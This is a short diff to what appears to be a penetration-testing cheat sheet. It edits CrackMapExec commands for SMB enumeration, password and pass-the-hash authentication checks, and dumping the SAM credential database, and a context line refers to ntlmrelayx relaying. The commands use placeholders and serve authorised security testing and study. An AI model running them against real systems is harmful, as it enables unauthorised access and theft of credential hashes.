@@ -42,7 +42,7 @@ ntlmrelayx.py -tf targets.txt (dumps successfully authenticated system's SAM dat
 *BASIC*
 Basic System Details - cme smb <IP>
 Check User Authentication - cme smb -u <username> -p '<password>' -d <domain> <IP>
-Check User Authentication via hash - cme smb -u <username> -H <ntlm> -d <domain> <IP> --shares
+Check User Authentication via hash - cme smb -u <username> -H <ntlm> -d <domain> <IP>
 
 **ADMIN**
 cme smb -u <username> -p <password> -d <domain> <IP> --sam
